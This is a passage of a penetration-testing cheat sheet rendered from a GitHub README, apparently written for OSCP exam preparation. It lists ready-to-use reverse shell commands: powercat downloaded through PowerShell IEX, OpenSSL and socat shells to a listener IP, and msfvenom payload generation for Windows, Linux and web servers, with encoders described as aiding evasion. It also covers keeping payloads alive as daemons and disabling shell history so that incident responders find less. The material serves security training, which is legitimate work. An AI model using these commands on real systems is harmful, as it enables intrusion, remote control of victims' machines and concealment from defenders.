cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=tun0 \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e iconv -t UTF-16LE \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e base64 \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e tr -d \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\\n\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAlso, you can use \u003ccode\u003epowercat.ps1\u003c/code\u003e, a netcat equivalent in PowerShell, with \"-e\" support.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"cp /usr/share/windows-resources/powercat/powercat.ps1 .\nsudo python -m http.server 80\nnc -lvnp 6969\"\u003e\u003cpre\u003ecp /usr/share/windows-resources/powercat/powercat.ps1 \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\nsudo python -m http.server 80\nnc -lvnp 6969\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eInvoke with:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"IEX (New-Object System.Net.Webclient).DownloadString(\u0026quot;http://LISTEN_IP/powercat.ps1\u0026quot;);powercat -c LISTEN_IP -p 6969 -e powershell\"\u003e\u003cpre\u003eIEX (\u003cspan class=\"pl-c1\"\u003eNew-Object\u003c/span\u003e System.Net.Webclient).DownloadString(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://LISTEN_IP/powercat.ps1\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e);powercat \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec LISTEN_IP \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ep \u003cspan class=\"pl-c1\"\u003e6969\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ee powershell\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eOpenSSL Encrypted Reverse Shell\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# generate key on server\nopenssl req -nodes -x509 -newkey rsa:2048 -days 365 -out cert.pem -keyout key.pem -batch\n# Start server listener\nsudo openssl s_server -accept 443 -key key.pem -cert cert.pem\n\n# Client-side reverse shell\nrm -f /tmp/f; mkfifo /tmp/f \u0026amp;\u0026amp; openssl s_client -connect SERVER_IP:443 -quiet \u0026lt; /tmp/f 2\u0026gt;/dev/null | /bin/sh 2\u0026gt;\u0026amp;0 \u0026gt; /tmp/f \u0026amp;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e generate key on server\u003c/span\u003e\nopenssl req -nodes -x509 -newkey rsa:2048 -days 365 -out cert.pem -keyout key.pem -batch\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Start server listener\u003c/span\u003e\nsudo openssl s_server -accept 443 -key key.pem -cert cert.pem\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Client-side reverse shell\u003c/span\u003e\nrm -f /tmp/f\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e mkfifo /tmp/f \u003cspan class=\"pl-k\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e openssl s_client -connect SERVER_IP:443 -quiet \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003e /tmp/f \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e /bin/sh \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u0026amp;0\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e /tmp/f \u003cspan class=\"pl-k\"\u003e\u0026amp;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eSocat Listener\u003c/strong\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eGreat to support full tty and/or encryption. See Socat Reverse Shell (next).\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# full tty over TCP\n# \u0026quot;-dd\u0026quot; prints fatal, error, warning, and notice messages\nsocat -dd file:`tty`,raw,echo=0 TCP-LISTEN:LISTEN_PORT\n\n# no tty, plaintext over TCP\nsocat -dd TCP-LISTEN:LISTEN_PORT STDOUT\n\n# full tty, encrypted with SSL (needs socat reverse shell using OPENSSL)\nsocat -dd file:`tty`,raw,echo=0 OPENSSL-LISTEN:LISTEN_PORT,cert=mycert.pem,verify=0,fork\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e full tty over TCP\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e \"-dd\" prints fatal, error, warning, and notice messages\u003c/span\u003e\nsocat -dd file:\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e`\u003c/span\u003etty\u003cspan class=\"pl-pds\"\u003e`\u003c/span\u003e\u003c/span\u003e,raw,echo=0 TCP-LISTEN:LISTEN_PORT\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e no tty, plaintext over TCP\u003c/span\u003e\nsocat -dd TCP-LISTEN:LISTEN_PORT STDOUT\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e full tty, encrypted with SSL (needs socat reverse shell using OPENSSL)\u003c/span\u003e\nsocat -dd file:\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e`\u003c/span\u003etty\u003cspan class=\"pl-pds\"\u003e`\u003c/span\u003e\u003c/span\u003e,raw,echo=0 OPENSSL-LISTEN:LISTEN_PORT,cert=mycert.pem,verify=0,fork\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eNote: to generate \u003ccode\u003emycert.pem\u003c/code\u003e see \u003ca href=\"#1051-create-self-signed-ssltls-certificate\"\u003ethese instructions\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eSocat Reverse Shell\u003c/strong\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eUse with Socat Listener (previous)\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# with full tty\nsocat -dd EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP:LISTEN_IP:443\n\n# no tty, text only\nsocat -dd EXEC:/bin/bash TCP:LISTEN_IP:443\n\n# full tty, encrypted with SSL (needs socat listener uing OPENSSL-LISTEN)\nsocat -dd EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:LISTEN_IP:443,verify=0\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e with full tty\u003c/span\u003e\nsocat -dd EXEC:\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e/bin/bash -li\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e,pty,stderr,setsid,sigint,sane TCP:LISTEN_IP:443\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e no tty, text only\u003c/span\u003e\nsocat -dd EXEC:/bin/bash TCP:LISTEN_IP:443\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e full tty, encrypted with SSL (needs socat listener uing OPENSSL-LISTEN)\u003c/span\u003e\nsocat -dd EXEC:\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e/bin/bash -li\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e,pty,stderr,setsid,sigint,sane OPENSSL:LISTEN_IP:443,verify=0\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eFor Windows victim, replace \u003ccode\u003e/bin/bash\u003c/code\u003e with \u003ccode\u003ecmd.exe\u003c/code\u003e or \u003ccode\u003epowershell.exe\u003c/code\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eMSFVenom\u003c/strong\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eYou can use \u003ccode\u003emsfvenom\u003c/code\u003e to generate reverse shells easily.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Basic Windows TCP reverse shell\nmsfvenom -p windows/shell_reverse_tcp -f exe -o derp.exe lport=443 lhost=tun0\n\n# Basic Linux TCP reverse shell\nmsfvenom -p linux/x86/shell_reverse_tcp -f elf -o derp.elf lport=443 lhost=tun0\n\n# web-based reverse shells\n# asp\nmsfvenom -p windows/shell/reverse_tcp -f asp -o derp.asp lport=443 lhost=tun0\n# jsp\nmsfvenom -p java/jsp_shell_reverse_tcp -f raw -o derp.jsp lport=443 lhost=tun0\n# war\nmsfvenom -p java/jsp_shell_reverse_tcp -f war -o derp.war lport=443 lhost=tun0\n# php\nmsfvenom -p php/reverse_php -f raw -o derp.php lport=443 lhost=tun0\n\n# Windows DLL that invokes commands you tell it:\nmsfvenom -p windows/exec -f dll -o shell32.dll cmd=\u0026quot;C:\\windows\\system32\\calc.exe\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Basic Windows TCP reverse shell\u003c/span\u003e\nmsfvenom -p windows/shell_reverse_tcp -f exe -o derp.exe lport=443 lhost=tun0\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Basic Linux TCP reverse shell\u003c/span\u003e\nmsfvenom -p linux/x86/shell_reverse_tcp -f elf -o derp.elf lport=443 lhost=tun0\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e web-based reverse shells\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e asp\u003c/span\u003e\nmsfvenom -p windows/shell/reverse_tcp -f asp -o derp.asp lport=443 lhost=tun0\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e jsp\u003c/span\u003e\nmsfvenom -p java/jsp_shell_reverse_tcp -f raw -o derp.jsp lport=443 lhost=tun0\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e war\u003c/span\u003e\nmsfvenom -p java/jsp_shell_reverse_tcp -f war -o derp.war lport=443 lhost=tun0\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e php\u003c/span\u003e\nmsfvenom -p php/reverse_php -f raw -o derp.php lport=443 lhost=tun0\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Windows DLL that invokes commands you tell it:\u003c/span\u003e\nmsfvenom -p windows/exec -f dll -o shell32.dll cmd=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eC:\\windows\\system32\\calc.exe\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eGetting help:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# list all available payloads\nmsfvenom --list payloads\n# list payloads for specific platform and architecture\nmsfvenom -l payloads --platform windows --arch x64\n\n# view payload options\nmsfvenom -p PAYLOAD --list-options\n\n# list encoders\n msfvenom -l encoders\n \n # list allowed output formats\n msfvenom -l formats\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list all available payloads\u003c/span\u003e\nmsfvenom --list payloads\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list payloads for specific platform and architecture\u003c/span\u003e\nmsfvenom -l payloads --platform windows --arch x64\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e view payload options\u003c/span\u003e\nmsfvenom -p PAYLOAD --list-options\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list encoders\u003c/span\u003e\n msfvenom -l encoders\n \n \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list allowed output formats\u003c/span\u003e\n msfvenom -l formats\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eCustom encoding:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ccode\u003e-e x86/shikata_ga_nai\u003c/code\u003e - best x86 encoder for evasion\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-e x64/xor\u003c/code\u003e - decent x64 option\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-i / --iterations \u0026lt;count\u0026gt;\u003c/code\u003e - number of encoding iterations (more = better evasion, bigger payload)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eAvoiding bad bytes (requires custom encoding): \u003ccode\u003e-b \"\\x00\\x0A\"\u003c/code\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003ePrepending nopsled: \u003ccode\u003e-n, --nopsled \u0026lt;length\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eShrinking your payload: \u003ccode\u003e--smallest\u003c/code\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eFor some Windows shellcode (mainly buffer overflow exploits), you might need to specify \u003ccode\u003eEXITFUNC=thread\u003c/code\u003e or \u003ccode\u003eEXITFUNC=seh\u003c/code\u003e as an option to make sure the shellcode executes and exits cleanly.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.3.1 Running a detached/daemonized process on Linux\u003c/h3\u003e\u003ca id=\"user-content-331-running-a-detacheddaemonized-process-on-linux\" class=\"anchor\" aria-label=\"Permalink: 3.3.1 Running a detached/daemonized process on Linux\" href=\"#331-running-a-detacheddaemonized-process-on-linux\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWhen delivering a payload, sometimes it needs to run as a daemon so it doesn't\ndie when the session/connection is closed. Normally you do this with \u003ccode\u003enohup\u003c/code\u003e,\n\u003ccode\u003edetach\u003c/code\u003e, \u003ccode\u003escreen\u003c/code\u003e, or \u003ccode\u003etmux\u003c/code\u003e, but sometimes none of those binaries are available.\nStill, you can accomplish creating a daemonized process by using sub-shells:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"( ( while true; do echo \u0026quot;insert reverse shell cmd here\u0026quot;; sleep 5; done \u0026amp;) \u0026amp;)\"\u003e\u003cpre\u003e( ( \u003cspan class=\"pl-k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003etrue\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003edo\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003einsert reverse shell cmd here\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e sleep 5\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003edone\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026amp;\u003c/span\u003e) \u003cspan class=\"pl-k\"\u003e\u0026amp;\u003c/span\u003e)\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.3.2 Covering your tracks\u003c/h3\u003e\u003ca id=\"user-content-332-covering-your-tracks\" class=\"anchor\" aria-label=\"Permalink: 3.3.2 Covering your tracks\" href=\"#332-covering-your-tracks\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWhen you connect via a reverse/bind shell, your commands get saved in the\nterminal history. To avoid logging this (to make incident response team's job\nharder), use the following as your first command:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# for bash, sh\nunset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND\n# for zsh, must tell it not to store anything in history\n# source: https://stackoverflow.com/a/68679235/5202294\nfunction zshaddhistory() {  return 1 }\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e for bash, sh\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eunset\u003c/span\u003e HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e for zsh, must tell it not to store anything in history\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e source: https://stackoverflow.com/a/68679235/5202294\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003efunction\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ezshaddhistory()\u003c/span\u003e {  \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e 1 }\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# for Windows PowerShell\nSet-PSReadlineOption HistorySaveStyle SaveNothing\n# - or -\nRemove-Module PSReadline\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e for Windows PowerShell\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eSet-PSReadlineOption\u003c/span\u003e HistorySaveStyle SaveNothing\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e - or -\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eRemove-Module\u003c/span\u003e PSReadline\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.3.3 Upgrading to Interactive Shell\u003c/h3\u003e\u003ca id=\"user-content-333-upgrading-to-interactive-shell\" class=\"anchor\" aria-label=\"Permalink: 3.3.3 Upgrading to Interactive Shell\" href=\"#333-upgrading-to-interactive-shell\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eUse this if you have a netcat-based reverse shell coming from a Linux box.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"###  In reverse shell  ##########\n# you might need to fix your PATH first\nexport PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'\n\n# start pty using python\npython3 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)'\n# windows equivalent\nc:\\python27\\python.exe -c 'import pty; pty.spawn(\u0026quot;c:\\windows\\system32\\cmd.exe\u0026quot;)'\n\n# Ctrl-Z, jumps you back to local shell by backgrounding reverse shell\n\n###  In local shell  ##########\n# Get TTY rows/cols for later:\nstty size # prints \u0026quot;rows cols\u0026quot;\n# ignore hotkeys in the local shell and get back to remote shell\nstty raw -echo; fg # hit enter TWICE after this\n\n###  In reverse shell  ##########\n# set correct size for remote shell (ROWS and COLS from stty size)\nstty rows ROWS cols COLS\n# enable terminal colors\nexport TERM=xterm-256color\n# reload bash to apply TERM env var\nexec /bin/bash\n\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e##  In reverse shell  ##########\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e you might need to fix your PATH first\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eexport\u003c/span\u003e PATH=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start pty using python\u003c/span\u003e\npython3 \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eimport pty; pty.spawn(\"/bin/bash\")\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e windows equivalent\u003c/span\u003e\nc:\u003cspan class=\"pl-cce\"\u003e\\p\u003c/span\u003eython27\u003cspan class=\"pl-cce\"\u003e\\p\u003c/span\u003eython.exe -c \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eimport pty; pty.spawn(\"c:\\windows\\system32\\cmd.exe\")\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Ctrl-Z, jumps you back to local shell by backgrounding reverse shell\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e##  In local shell  ##########\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Get TTY rows/cols for later:\u003c/span\u003e\nstty size \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e prints \"rows cols\"\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e ignore hotkeys in the local shell and get back to remote shell\u003c/span\u003e\nstty raw -echo\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003efg\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e hit enter TWICE after this\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e##  In reverse shell  ##########\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e set correct size for remote shell (ROWS and COLS from stty size)\u003c/span\u003e\nstty rows ROWS cols COLS\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e enable terminal colors\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eexport\u003c/span\u003e TERM=xterm-256color\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e reload bash to apply TERM env var\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eexec\u003c/span\u003e /bin/bash\n\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.4 Metasploit\u003c/h2\u003e\u003ca id=\"user-content-34-metasploit\" class=\"anchor\" aria-label=\"Permalink: 3.4 Metasploit\" href=\"#34-metasploit\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThe Metasploit framework is only allowed to be used on one box on the OSCP exam, but it has great tools to make exploitation and post-exploit interaction easier.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eInitializing Metasploit (first time running it):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" 